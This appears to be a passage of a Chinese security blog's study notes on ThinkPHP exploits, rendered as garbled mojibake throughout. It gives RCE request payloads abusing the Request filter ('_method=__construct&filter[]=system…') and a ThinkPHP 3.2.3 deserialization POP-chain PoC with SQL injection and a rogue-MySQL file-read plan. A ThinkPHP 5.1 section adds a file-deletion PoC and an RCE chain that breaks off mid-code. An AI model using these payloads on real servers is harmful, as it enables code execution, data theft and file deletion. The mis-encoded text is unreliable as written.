filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters);//å¼¹å‡ºå¹¶è¿”å› array æ•°ç»„çš„æœ€åä¸€ä¸ªå•å…ƒï¼Œå¹¶å°†æ•°ç»„ array çš„é•¿åº¦å‡ä¸€ã€‚ foreach ($filters as $filter) { if (is_callable($filter)) {//æ˜¯å¦èƒ½è°ƒç”¨ $value = call_user_func($filter, $value); } elseif (is_scalar($value)) {//æ£€æµ‹å˜é‡æ˜¯å¦æ˜¯ä¸€ä¸ªæ ‡é‡ if (false !== strpos($filter, &#39;/&#39;)) {//strposæ£€æµ‹å­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç° // æ­£åˆ™è¿‡æ»¤ if (!preg_match($filter, $value)) { // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼ $value = $default; break; } } elseif (!empty($filter)) { // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤ // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) { $value = $default; break; } } } } return $this-&gt;filterExp($value); } è‡ªå·±å°è¯•ç†è§£ä¸‹ï¼Œé¦–å…ˆdefaultè¢«èµ‹äºˆfiltersçš„æœ€åä¸€ä¸ªå€¼ï¼Œç„¶åä¸€ä¸ªä¸ªå°è¯•filtersé‡Œå‰©ä¸‹çš„å€¼æ˜¯å¦ä¸ºèƒ½è°ƒç”¨çš„å‡½æ•°ï¼Œæ˜¯çš„è¯ç›´æ¥è°ƒç”¨ï¼Œä¸æ˜¯çš„è¯æ£€æµ‹valueé‡Œæ˜¯å¦æ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œæ˜¯çš„è¯ç»§ç»­åˆ¤æ–­filteré‡Œæœ‰æ— /ï¼Œæœ‰åˆ™å°†defaultå³filtersçš„æœ€åä¸€ä¸ªå€¼èµ‹ç»™å®ƒã€‚å¦åˆ™ï¼ˆè¿™ä¸ªå¦åˆ™æ˜¯é’ˆå¯¹filtersé‡Œæ˜¯å¦æœ‰/ï¼‰åˆ¤æ–­filteræ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™è¿›è¡Œæºç æ³¨é‡Šé‡Œçš„åˆ¤æ–­ã€‚çœ‹ä¼¼è«åå…¶å¦™ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¨å±€æœä¸€ä¸‹è°ƒç”¨filterValueçš„æ–¹æ³•ï¼š inputé‡Œé¢è°ƒç”¨äº†å®ƒã€‚æ— è®º$dataæ˜¯ä¸æ˜¯æ•°ç»„æœ€ç»ˆéƒ½ä¼šè°ƒç”¨filterValueæ–¹æ³•ï¼Œè€Œ$filteråˆ™ä¼šè¿›è¡Œè¿‡æ»¤å™¨è§£æï¼Œè·Ÿè¿›$this-&gt;getFilteræ–¹æ³•æŸ¥çœ‹è§£æè¿‡ç¨‹: è¯´å®è¯è¿™ä¸ªæˆ‘æ²¡å¤ªç†è§£ æš‚ä¸”ç»§ç»­å¾€ä¸‹çœ‹å›åˆ°inputæ–¹æ³•ä¸­ï¼Œarray_walk_recursiveå‡½æ•°ä¼šå¯¹ç¬¬ä¸€ä¸ªæ•°ç»„å‚æ•°ä¸­çš„æ¯ä¸ªå…ƒç´ åº”ç”¨ç¬¬äºŒä¸ªå‚æ•°çš„å‡½æ•°ã€‚åœ¨inputç±»æ–¹æ³•ä¸­ï¼Œ$dataä¸­é”®åä½œä¸ºfilterValue(&amp;$value, $key, $filters)ä¸­çš„value,é”®å€¼ä½œä¸ºkey,filterä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°$filters,è€Œå½“è¿™äº›ä¼ å…¥åˆ°filterValueåï¼Œcall_user_funcåˆæ˜¯åˆ©ç”¨filterä½œä¸ºå›è°ƒçš„å‡½æ•°ï¼Œvalueä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œå› æ­¤ä¹Ÿå°±æ˜¯inputæ–¹æ³•ä¸­çš„dataæ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œfilteræ˜¯éœ€è¦å›è°ƒçš„å‡½æ•°ã€‚äº†è§£ä¹‹åæˆ‘ä»¬éœ€è¦æŸ¥æ‰¾inputæ–¹æ³•åœ¨ä½•å¤„è¢«è°ƒç”¨ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹ï¼šåŒæ–‡ä»¶paramæ–¹æ³•æœ€åè°ƒç”¨è¯¥æ–¹æ³•å¹¶ä½œä¸ºè¿”å›ï¼š $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); ä½œä¸ºdataä¼ å…¥inputï¼Œè·Ÿè¿›$this-&gt;get å¦‚æœ$this-&gt;getä¸ºç©ºï¼Œç›´æ¥å°†å…¶èµ‹å€¼ä¸º$_GET,è€Œæœ€åå°†$this-&gt;getä½œä¸ºinputæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¬è¿‡å˜é‡è¦†ç›–ï¼Œç›´æ¥å°†$this-&gt;getèµ‹å€¼ï¼Œå°±æ­¤æˆ‘ä»¬æ§åˆ¶äº†å›è°ƒå‡½æ•°å’Œå‚æ•°ã€‚ å³_method=__construct&amp;filter[]=system&amp;get[]=whoamiæˆ–è€…_method=__construct&amp;filter[]=system&amp;route[]=whoamiã€‚ é‡æ–°æ¨ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶Requestç±»æ‰€æœ‰æ–¹æ³•åŠå±æ€§ã€‚åœ¨paramæ–¹æ³•é‡Œï¼Œ$method = $this-&gt;method(true);è·Ÿä¸€ä¸‹method å†è·Ÿè¿›serverï¼š $nameçš„å€¼æ˜¯REQUEST_METHODã€‚server()æ–¹æ³•ä¸­åˆè·Ÿè¿›äº†input()æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°$this-&gt;serverå¯ä»¥åˆ©ç”¨ä¹‹å‰__construct()æ–¹æ³•è¿›è¡Œå±æ€§è¦†ç›–ï¼Œå› æ­¤$this-&gt;serverå¯æ§ã€‚è·Ÿè¿›input()æ–¹æ³•ï¼š $nameæ˜¯REQUEST_METHODï¼Œä¼šè¿›å…¥if (â€˜â€™ != $name) {ã€‚è¿™äº›ä»£ç å°±ç›¸å½“äº$data=$data[â€˜REQUEST_METHODâ€™]ã€‚è€Œ$dataå°±æ˜¯å¯æ§çš„$this-&gt;serverï¼Œå› æ­¤è¿™é‡Œ$dataä¹Ÿå¯æ§ã€‚å†å¾€ä¸‹çœ‹ï¼š ç›¸å½“äº$filter=$this-&gt;filterï¼Œå› æ­¤è¿‡æ»¤å™¨ä¹Ÿå¯æ§ã€‚æ¥ä¸‹æ¥å°±è¿›å…¥äº†filterValueæ–¹æ³•ï¼Œ$dataæ˜¯å¯æ§çš„å‚æ•°ï¼Œ$filteræ˜¯å¯æ§çš„å‡½æ•°ï¼Œå†è¿›å…¥åˆ©ç”¨call_user_funcå³å¯RCEã€‚æœ€ç»ˆæ„é€ ï¼š _method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=dir æˆåŠŸæ‰§è¡Œï¼Œå±å®³æå¤§ã€‚ æ¼æ´åŸå› ï¼šmethodæ²¡æœ‰è¿›è¡Œé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥ä»»æ„è°ƒç”¨ã€è¦†ç›–ç±»å’Œå±æ€§ã€‚å‚è€ƒï¼šhttps://www.anquanke.com/post/id/222672https://blog.csdn.net/rfrder/article/details/114298944 5.x &lt; 5.1.31 rce 4/2https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection å…ˆæ”¾ä¸ªé“¾æ¥ ThinkPHP5æ·±å…¥å­¦ä¹  4/6å®˜æ–¹æ–‡æ¡£ï¼šhttps://www.kancloud.cn/manual/thinkphp5/118003 project åº”ç”¨éƒ¨ç½²ç›®å½• â”œâ”€application åº”ç”¨ç›®å½•ï¼ˆå¯è®¾ç½®ï¼‰ â”‚ â”œâ”€common å…¬å…±æ¨¡å—ç›®å½•ï¼ˆå¯æ›´æ”¹ï¼‰ â”‚ â”œâ”€index æ¨¡å—ç›®å½•(å¯æ›´æ”¹) â”‚ â”‚ â”œâ”€config.php æ¨¡å—é…ç½®æ–‡ä»¶ â”‚ â”‚ â”œâ”€common.php æ¨¡å—å‡½æ•°æ–‡ä»¶ â”‚ â”‚ â”œâ”€controller æ§åˆ¶å™¨ç›®å½• â”‚ â”‚ â”œâ”€model æ¨¡å‹ç›®å½• â”‚ â”‚ â”œâ”€view è§†å›¾ç›®å½• â”‚ â”‚ â””â”€ ... æ›´å¤šç±»åº“ç›®å½• â”‚ â”œâ”€command.php å‘½ä»¤è¡Œå·¥å…·é…ç½®æ–‡ä»¶ â”‚ â”œâ”€common.php åº”ç”¨å…¬å…±ï¼ˆå‡½æ•°ï¼‰æ–‡ä»¶ â”‚ â”œâ”€config.php åº”ç”¨ï¼ˆå…¬å…±ï¼‰é…ç½®æ–‡ä»¶ â”‚ â”œâ”€database.php æ•°æ®åº“é…ç½®æ–‡ä»¶ â”‚ â”œâ”€tags.php åº”ç”¨è¡Œä¸ºæ‰©å±•å®šä¹‰æ–‡ä»¶ â”‚ â””â”€route.php è·¯ç”±é…ç½®æ–‡ä»¶ â”œâ”€extend æ‰©å±•ç±»åº“ç›®å½•ï¼ˆå¯å®šä¹‰ï¼‰ â”œâ”€public WEB éƒ¨ç½²ç›®å½•ï¼ˆå¯¹å¤–è®¿é—®ç›®å½•ï¼‰ â”‚ â”œâ”€static é™æ€èµ„æºå­˜æ”¾ç›®å½•(css,js,image) â”‚ â”œâ”€index.php åº”ç”¨å…¥å£æ–‡ä»¶ â”‚ â”œâ”€router.php å¿«é€Ÿæµ‹è¯•æ–‡ä»¶ â”‚ â””â”€.htaccess ç”¨äº apache çš„é‡å†™ â”œâ”€runtime åº”ç”¨çš„è¿è¡Œæ—¶ç›®å½•ï¼ˆå¯å†™ï¼Œå¯è®¾ç½®ï¼‰ â”œâ”€vendor ç¬¬ä¸‰æ–¹ç±»åº“ç›®å½•ï¼ˆComposerï¼‰ â”œâ”€thinkphp æ¡†æ¶ç³»ç»Ÿç›®å½• â”‚ â”œâ”€lang è¯­è¨€åŒ…ç›®å½• â”‚ â”œâ”€library æ¡†æ¶æ ¸å¿ƒç±»åº“ç›®å½• â”‚ â”‚ â”œâ”€think Think ç±»åº“åŒ…ç›®å½• â”‚ â”‚ â””â”€traits ç³»ç»Ÿ Traits ç›®å½• â”‚ â”œâ”€tpl ç³»ç»Ÿæ¨¡æ¿ç›®å½• â”‚ â”œâ”€.htaccess ç”¨äº apache çš„é‡å†™ â”‚ â”œâ”€.travis.yml CI å®šä¹‰æ–‡ä»¶ â”‚ â”œâ”€base.php åŸºç¡€å®šä¹‰æ–‡ä»¶ â”‚ â”œâ”€composer.json composer å®šä¹‰æ–‡ä»¶ â”‚ â”œâ”€console.php æ§åˆ¶å°å…¥å£æ–‡ä»¶ â”‚ â”œâ”€convention.php æƒ¯ä¾‹é…ç½®æ–‡ä»¶ â”‚ â”œâ”€helper.php åŠ©æ‰‹å‡½æ•°æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰ â”‚ â”œâ”€LICENSE.txt æˆæƒè¯´æ˜æ–‡ä»¶ â”‚ â”œâ”€phpunit.xml å•å…ƒæµ‹è¯•é…ç½®æ–‡ä»¶ â”‚ â”œâ”€README.md README æ–‡ä»¶ â”‚ â””â”€start.php æ¡†æ¶å¼•å¯¼æ–‡ä»¶ â”œâ”€build.php è‡ªåŠ¨ç”Ÿæˆå®šä¹‰æ–‡ä»¶ï¼ˆå‚è€ƒï¼‰ â”œâ”€composer.json composer å®šä¹‰æ–‡ä»¶ â”œâ”€LICENSE.txt æˆæƒè¯´æ˜æ–‡ä»¶ â”œâ”€README.md README æ–‡ä»¶ â”œâ”€think å‘½ä»¤è¡Œå…¥å£æ–‡ä»¶ ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾ 4/26æ¥è‡ª[çº¢æ˜è°·CTF 2021]EasyTPçš„è€ƒç‚¹ï¼Œé‡åˆ°äº†å°±æ¥åˆ†æä¸€ä¸‹ï¼Œä¸èƒ½çåªçœ¼é—­åªçœ¼çœ‹ä¸€éã€‚ ç¯å¢ƒæ­å»ºï¼šcomposer create-project topthink/thinkphp=3.2.3 tp3 POPé“¾åˆ†æ:1ã€æ‰¾èµ·ç‚¹å…¨å±€æœ__destruct() è¿™é‡Œçš„$this-&gt;imgå¯æ§ï¼Œä¸”è°ƒç”¨äº†$this-&gt;imgçš„destroy()ã€‚ è·³æ¿1ï¼šé¦–å…ˆæ‰¾ä¸€ä¸ªåŒ…å«destroy()å‡½æ•°çš„ç±» Memcache.class.php ä½†æ˜¯è¿™é‡Œdestroyéœ€è¦ä¼ å€¼ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸‹æ‰¾ã€‚ è·³æ¿2ï¼š ä¸Šé¢$this-&gt;handleå¯æ§ï¼Œå¹¶ä¸”è°ƒç”¨äº†$this-&gt;handleçš„delete()æ–¹æ³•ï¼Œä¸”ä¼ è¿‡å»çš„å‚æ•°æ˜¯éƒ¨åˆ†å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç»§ç»­å¯»æ‰¾æœ‰delete()æ–¹æ³•çš„è·³æ¿ç±»ã€‚ å…¨å±€æœç´¢function delete( è¿™é‡Œçš„$pkå…¶å®å°±æ˜¯$this-&gt;pkï¼Œæ˜¯å®Œå…¨å¯æ§çš„ã€‚ ä¸‹é¢çš„$optionsæ˜¯ä»è·³æ¿1ä¼ è¿‡æ¥çš„ï¼Œåœ¨è·³æ¿1ä¸­å¯ä»¥æ§åˆ¶å…¶æ˜¯å¦ä¸ºç©ºã€‚$this-&gt;options[â€˜whereâ€™]æ˜¯æˆå‘˜å±æ€§ï¼Œæ˜¯å¯æ§çš„ï¼Œå› æ­¤506è¡Œçš„æ¡ä»¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œä¸”508è¡Œçš„æ¡ä»¶æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¨‹åºèµ°åˆ°509è¡Œã€‚ åœ¨509ä¸­åˆè°ƒç”¨äº†ä¸€æ¬¡è‡ªå·±$this-&gt;delete()ï¼Œä½†æ˜¯è¿™æ—¶å€™çš„å‚æ•°$this-&gt;data[$pk]æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚(é‡ç‚¹ è¿™æ—¶delete()æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸå¸¦å¯æ§å‚æ•°è®¿é—®äº†ã€‚ è¿™æ—¶å€™ç†Ÿæ‚‰ThinkPHPçš„å¸ˆå‚…ä»¬å°±åº”è¯¥æ‡‚äº†ã€‚è¿™æ˜¯ThinkPHPçš„æ•°æ®åº“æ¨¡å‹ç±»ä¸­çš„delete()æ–¹æ³•ï¼Œæœ€ç»ˆä¼šå»è°ƒç”¨åˆ°æ•°æ®åº“é©±åŠ¨ç±»ä¸­çš„delete()ä¸­å»ï¼Œä¹Ÿå°±æ˜¯558è¡Œã€‚ä¸”ä¸Šé¢çš„ä¸€å †æ¡ä»¶åˆ¤æ–­å¾ˆæ˜¾ç„¶éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åŒ…æ‹¬è°ƒç”¨$this-&gt;db-&gt;delete($options)æ—¶çš„$optionså‚æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ã€‚ é‚£ä¹ˆè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ä»»æ„è‡ªå¸¦çš„æ•°æ®åº“ç±»ä¸­çš„delete()æ–¹æ³•äº†ã€‚ ç»ˆç‚¹:/ThinkPHP/Library/Think/Db/Driver.class.php è¿™è¾¹çš„å‚æ•°æ˜¯å®Œå…¨å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„$tableæ˜¯å¯æ§çš„ï¼Œå°†$tableæ‹¼æ¥åˆ°$sqlä¼ å…¥äº†$this-&gt;execute()ã€‚ è¿™é‡Œæœ‰ä¸ªåˆå§‹åŒ–æ•°æ®åº“è¿æ¥çš„åœ°æ–¹ å¯ä»¥é€šè¿‡æ§åˆ¶æˆå‘˜å±æ€§ï¼Œä½¿ç¨‹åºè°ƒç”¨åˆ°$this-&gt;connect()ã€‚ å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯å»ä½¿ç”¨$this-&gt;configé‡Œçš„é…ç½®å»åˆ›å»ºäº†æ•°æ®åº“è¿æ¥ï¼Œæ¥ç€å»æ‰§è¡Œå‰é¢æ‹¼æ¥çš„DELETESQLè¯­å¥ã€‚ åˆ°æ­¤ï¼Œæˆ‘ä»¬å°±æ‰¾åˆ°äº†ä¸€æ¡å¯ä»¥è¿æ¥ä»»æ„æ•°æ®åº“çš„POPé“¾ã€‚ 1ã€é€šè¿‡æŸå¤„leakå‡ºç›®æ ‡çš„WEBç›®å½•(e.g. DEBUGé¡µé¢)2ã€å¼€å¯æ¶æ„MySQLæ¶æ„æœåŠ¡ç«¯è®¾ç½®è¯»å–çš„æ–‡ä»¶ä¸ºç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶3ã€è§¦å‘ååºåˆ—åŒ–4ã€è§¦å‘é“¾ä¸­PDOè¿æ¥çš„éƒ¨åˆ†5ã€è·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®6ã€ä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡å‡ºå‘ååºåˆ—åŒ–7ã€è§¦å‘é“¾ä¸­DELETEè¯­å¥çš„SQLæ³¨å…¥ POC: &lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp3&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;&quot; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-&gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-&gt;db = new Mysql(); $this-&gt;options[&#39;where&#39;] = &#39;&#39;; $this-&gt;pk = &#39;id&#39;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); } æ€è·¯ï¼šhttps://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVktå®æˆ˜ï¼š[çº¢æ˜è°·CTF 2021]EasyTP Thinkphp5.1 ååºåˆ—åŒ–åˆ†æ 2021/9/252021/9/25 é¦–å…ˆå¿…é¡»è¦åæ§½çš„æ˜¯ï¼Œå› ä¸ºè‡ªå·±å¤ªæ†¨è¢«tpçš„è·¯ç”±è®¾ç½®æäº†ä¸€ä¸ªå¤šå°æ—¶ã€‚åœ¨application/index/controllerä¸‹åˆ›å»ºä¸ªæ–°çš„æ§åˆ¶å™¨ï¼Œå¹¶åœ¨route/route.phpè®¾ç½®äº†è·¯ç”± æœ€å¼€å§‹ç›´æ¥è®¿é—®çš„www.tp.com:xxx/unserializeï¼Œç›´æ¥404ï¼Œè®¿é—®ä¸Šé¢è‡ªå¸¦çš„thinkä¹Ÿæ˜¯404ï¼Œç„¶è€Œè¿™æ—¶å€™æ²¡æœ‰æ„è¯†åˆ°æ˜¯è®¿é—®è·¯å¾„çš„é—®é¢˜ã€‚ã€‚ã€‚ä»¥ä¸ºé—®é¢˜å‡ºåœ¨äº†è®¾ç½®å’Œnginxä¸Šï¼Œä½†æ˜¯æ’æŸ¥äº†ä¸€åœˆå‘ç°éƒ½æ²¡é—®é¢˜ã€‚æœ€åæ‰å‘ç°è¦è¿™æ ·è®¿é—®ï¼šwww.tp.com:xxx/index.php/unserialize éº»äº†ã€‚ è¿™æ¡é“¾ä»/thinkphp/library/think/process/pipes/Windows.phpçš„__destruct()æ–¹æ³•å…¥æ‰‹ã€‚ closeæ²¡ç”¨ï¼Œå…³é—­ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æŒ‡é’ˆã€‚ æ­¤å¤„fileæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶åˆ é™¤çš„æ¼æ´ã€‚ POC: &lt;?php namespace think\\process\\pipes; class Pipes { } class Windows extends Pipes { private $files = []; public function __construct(){ $this-&gt;files=[&#39;éœ€è¦åˆ é™¤æ–‡ä»¶çš„è·¯å¾„&#39;]; } } echo base64_encode(serialize(new Windows())); file_existså‡½æ•°ä¼šå°†filenameå½“ä½œå­—ç¬¦ä¸²å¤„ç†ï¼Œè¿™å¾ˆå®¹æ˜“è”æƒ³åˆ°toStringæ–¹æ³•ï¼Œ å…¨å±€æœç´¢toStringï¼Œæ‰¾åˆ°\\thinkphp\\library\\think\\model\\concern\\Conversion.phpä¸­Conversionç±»çš„toStringæ–¹æ³• è·Ÿè¿›toJson optionsä¸º256ï¼Œè·Ÿè¿›toArray é¦–å…ˆè¦æ˜ç¡®æˆ‘ä»¬è¦æ‰¾çš„æ˜¯ä»€ä¹ˆï¼Œ$å¯æ§å˜é‡-&gt;æ–¹æ³•(å‚æ•°å¯æ§)ï¼Œå›¾ä¸­ç®­å¤´æ‰€æŒ‡æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚appendå¯æ§ï¼Œæ‰€ä»¥relationä¹Ÿå¯æ§ã€‚ è·Ÿè¿›getRelationæ–¹æ³•çœ‹çœ‹æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹ï¼š keyå¯æ§ï¼Œæ‰€ä»¥nameå¯æ§ï¼Œå¯è¿‡ç¬¬ä¸€ä¸ªifã€‚ä½†æ˜¯elseifé‡Œä¹Ÿæ— æ³•åˆ©ç”¨ã€‚é‚£ä¹ˆå‰©ä¸‹çš„åªæœ‰è¿”å›ç©ºã€‚ æ»¡è¶³if (!$relation)ï¼Œè·Ÿè¿›getAttr é¦–å…ˆè·Ÿè¿›getDataçœ‹çœ‹ï¼š è¿˜æ˜¯æ— æ³•åˆ©ç”¨ï¼Œå›åˆ°Conversiton.php åæ­£relationæ˜¯å¯æ§çš„ï¼Œé‚£å°±ç»§ç»­çœ‹çœ‹ä¸‹é¢visibleèƒ½ä¸èƒ½åˆ©ç”¨ï¼Œå…¨å±€æœä¸€æ³¢ã€‚ æ’ä¸€æ¡çŸ¥è¯†ï¼šè‡ª PHP 5.4.0 èµ·ï¼ŒPHP å®ç°äº†ä¸€ç§ä»£ç å¤ç”¨çš„æ–¹æ³•ï¼Œç§°ä¸º traitã€‚é€šè¿‡åœ¨ç±»ä¸­ä½¿ç”¨use å…³é”®å­—ï¼Œå£°æ˜è¦ç»„åˆçš„Traitåç§°ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œç±»çš„ç»§æ‰¿è¦ä½¿ç”¨useå…³é”®å­—ã€‚ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­ç±»åŒæ—¶ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»ã€‚ ä½†æ˜¯æŠ½è±¡ç±»ä¸èƒ½ç›´æ¥è¢«å®ä¾‹åŒ–ã€‚æŠ½è±¡ç±»ä¸èƒ½è¢«ç›´æ¥å®ä¾‹åŒ–ã€‚æŠ½è±¡ç±»ä¸­åªå®šä¹‰ï¼ˆæˆ–éƒ¨åˆ†å®ç°ï¼‰å­ç±»éœ€è¦çš„æ–¹æ³•ã€‚å­ç±»å¯ä»¥é€šè¿‡ç»§æ‰¿æŠ½è±¡ç±»å¹¶é€šè¿‡å®ç°æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œä½¿æŠ½è±¡ç±»å…·ä½“åŒ–ã€‚å¦‚æœå­ç±»éœ€è¦å®ä¾‹åŒ–ï¼Œå‰ææ˜¯å®ƒå®ç°äº†æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ã€‚å¦‚æœå­ç±»æ²¡æœ‰å…¨éƒ¨å®ç°æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¯¥å­ç±»ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå¿…é¡»åœ¨ class å‰é¢åŠ ä¸Š abstract å…³é”®å­—ï¼Œå¹¶ä¸”ä¸èƒ½è¢«å®ä¾‹åŒ–ã€‚æ‰€ä»¥å…¨å±€æœextends Modelï¼Œæ‰¾åˆ°Pivot.phpã€‚ å›åˆ°åˆšåˆšvisibleé‚£é‡Œï¼Œå…¨å±€æœä¸‹æ¥æ²¡æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„åŒ…å«visibleæ–¹æ³•çš„ç±»ï¼Œæ‰€ä»¥è½¬æ¢æ€è·¯æ‰¾callã€‚çœ‹çœ‹æœ‰æ²¡æœ‰å’Œcall_user_funcå’Œcall_user_func_arrayä¸€èµ·çš„ã€‚ public function __call($method, $args)æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ˜¯argsï¼Œmethodä¸ºvisibleã€‚ æ’é™¤æ‰å‚æ•°ä¸å¯æ§å’Œå‚æ•°å¯æ§ä½†æ˜¯æ˜¯æŠ½è±¡å‡½æ•°çš„æŸ¥è¯¢ç»“æœã€‚ Requestç±»çš„è¿™ä¸ªä¼¼ä¹å¯ä»¥ç”¨ã€‚array_unshift â€” åœ¨æ•°ç»„å¼€å¤´æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒã€‚è¿™å°±å¯¼è‡´ç¬¬ä¸€ä¸ªå‚æ•°ä¸å¯æ§ã€‚åªèƒ½ call_user_func_array([$obj,â€ä»»æ„æ–¹æ³•â€],[$this,ä»»æ„å‚æ•°])ä¹Ÿå°±æ˜¯$obj-&gt;$func($this,$argv) è¿™æ˜¯å¾ˆå›°éš¾çš„ã€‚ä½†æ˜¯Thinkphpä½œä¸ºä¸€ä¸ªwebæ¡†æ¶,Requestç±»ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½å°±æ˜¯è¿‡æ»¤å™¨ filter(ThinkPHPçš„å¤šä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œéƒ½æ˜¯å‡ºè‡ªæ­¤å¤„)æ‰€ä»¥å¯ä»¥å°è¯•è¦†ç›–filterçš„æ–¹æ³•å»æ‰§è¡Œä»£ç åœ¨/thinkphp/library/think/Request.phpä¸­æ‰¾åˆ°äº†filterValue()æ–¹æ³•ã€‚ æ­¤å¤„valueä¸å¯æ§ï¼Œå¯»æ‰¾èƒ½æ§åˆ¶çš„ç‚¹ å…¶ä¸­filterä¸ºthis-&gt;filterï¼Œæ‰€ä»¥ä¸å¯æ§çš„åªå‰©ä¸‹å›è°ƒå‡½æ•°çš„å‚æ•°äº†ï¼Œå¯»æ‰¾è°ƒç”¨inputæ–¹æ³•çš„åœ°æ–¹ æ‰¾åˆ°äº†paramï¼Œçœ‹return $this-&gt;input($this-&gt;param, $name, $default, $filter);this-&gt;paramæ˜¯ç”±æœ¬æ¥çš„$this-&gt;paramï¼Œè¿˜æœ‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶ã€‚æ‰€ä»¥æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤å¸è½½getå‚æ•°é‡Œå³å¯ã€‚ ä½†æ˜¯è¿™é‡Œå‚æ•°è¿˜æ˜¯ä¸å¯æ§ã€‚ã€‚ã€‚ã€‚ç»§ç»­æ‰¾ æ‰¾åˆ°isAjaxå‡½æ•°ï¼Œconfigæ˜¯å¯æ§çš„ã€‚æ‰€ä»¥paramä¸­nameå°±æ˜¯å¯æ§çš„ ä¸ºäº†çœ‹çš„æ›´æ¸…æ¥šäº›ï¼Œç”»äº†ä¸ªç®€å›¾ï¼š POCï¼š &lt;?php namespace think\\process\\pipes{ use think\\model\\Pivot; class Windows { private $files = []; public function __construct(){ $this-&gt;files[]=new Pivot(); } } } namespace think{ abstract class Model { protected $append = []; private $data = []; public function __construct(){ $this-&gt;data=array( &#39;Troy3e&#39;=&gt;new Request() ); $this-&gt;append=array( &#39;Troy3e&#39;=&gt;array( &#39;sakurajima&#39;=&gt;&#39;mai&#39; ) ); } } } namespace think\\model{ use think\\Model; class Pivot extends 